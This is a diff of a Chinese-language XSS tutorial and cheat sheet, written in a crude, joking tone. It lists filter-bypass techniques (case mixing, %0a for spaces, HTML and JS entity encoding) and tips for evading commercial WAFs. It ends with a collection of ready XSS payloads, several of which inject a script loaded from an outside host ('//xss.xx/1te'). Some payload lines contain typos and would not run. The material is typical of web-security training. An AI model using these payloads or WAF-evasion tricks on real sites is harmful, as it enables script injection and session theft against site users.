@@ -1,8 +1,14 @@
-# XSS之王张禧
+# XSS之王xidaner
+> 详细代码请转常用代码篇，有很多代码分析和实例，此片仅供思路。
+靶场：
+http://demo.testfire.net/search.jsp?query=1
 
 ## **直接x他，x他🐎的！**
 
-首先先打个经典代码试试看，虽然说90%不行，但是万一呢？对吧！
+首先先打个`<a>,<b>`试试看，康康到底能不能输入一个框啊什么的，试试水对吧。在确定了可以在页面加入一个`<b>`或者一个`<a>`然后尝试后者：
+
+
+就直接尝试xss语句，虽然90%不行，但是万一呢？对吧！
 
 ```
 <script>alert('xss');</script>
@@ -19,7 +25,21 @@
 字符查看一下，那些被过滤了，那些被转义了，那些被删除了。
 
 
+## 首先 构造一个payload
 
+首先一个`xss payload`基本有以下几部分组成
+
+[TAG]填充标签img svg video button...
+[ATTR]=Something 填充一些非必要的属性 src=1 xmlns="jp.pornhub.com/"(a君：`兄弟借一步说话`GKDGKD)
+
+[EVENT]填充事件属性onerror onload...
+[PAYLOAD]填充JavaScript代码alert(1) top.alert(1)...
+
+大体可以理解为：
+```h
+<[TAG]    [ATTR]=  sth    [EVENT]   =   [PAYLOAD] />
+ 标签头    属性     事件   事件属性        代码
+```
 
 
 
@@ -30,8 +50,6 @@
 <sCrIpT><>
 <Imimgg><>
 ```
-
-
 
 
 
@@ -132,16 +150,62 @@ user=" type="text" onclick="alert(1)"
 
 ## **构造payload(采用%0a绕过空格过滤)**
 如果过滤了`script、/、与空格`
-在url中直接加入`%0a`绕过空格过滤
+在url中直接加入`%0a`绕过空格过滤，解析出来不一样吗，火狐他不香吗？
 ```
 http://127.0.0.1/xss/level16.php?keyword=<img%0asrc=1%0aonerror=alert(1)>
 ```
 
 ## **如果过滤了双引号和尖括号**
-html实体编码来过滤尖括号和双引号
+html`实体编码`来过滤尖括号和双引号也是属于编码绕过的一种，测试只有火狐可以实现(A君：谷歌你🐎死了)
 ```
 http://IP/xss/level17.php?arg01=a&arg02=b onmouseover=alert(1)
 
 ```
+
+当在url输入被过滤等因素后，可以尝试在输入框中加入`js代码`并使用js实体绕过:
+
+**js实体编码**
+
+javascrip&#x74;:alert(1) 十六进制
+javascrip&#116;:alert(1) 十进制
+
+
+## [**绕WAF**](https://xz.aliyun.com/t/6652)
+当你兴致*勃勃* 输入了第一串代码`<b>`,欸？我日你妈 D盾，创宇盾拦截，百度云盾拦截。小逼崽子**D盾**三天之内祝你**心想事成！** 
+
+> D盾还好，只是拦截，你还可以FUZZ,创宇盾直接给你ip封了，md我搞你还要准备几十个ip？
+
+不常见标签
+
+XSSfuzz生成器:https://github.com/NytroRST/XSSFuzzer/blob/master/fuzzer.html
+
+```html
+<details> <button> <select> <keygen> <textarea>等等
+```
+
+从网上收集的几个payload:
+```html
+
+<details open ontoggle=prompt(1)>
+      <details open ontoggle=prompt(1)>
+      <button onfocus=prompt(1) autofocus>
+      <select autofocus onfocus=prompt(1)>
+
+ <input autofocus onfocus=s=createElement("scriPt");body . appendChild(s);s.src="//xss.xx/1te">
+
+ <keygen autofocus onfocus =s=createElement("scriPt" );body . appendchild(s);s. src="//xss.xx/1te">
+
+<textarea autofocus onfocus=s=createElement("scriPt"); bady appendChild(s);s.src="//xss.xx/1te">
+
+<video onkeyup=setTimeout`al\x65rt\x28/2/\x29```>
+
+<svg src=1 onload=alert(1) />
+<svg value=1 onload=alert(1) />
+<video value=1 onerror=alert(1) />
+
+```
+
+
+
 
 
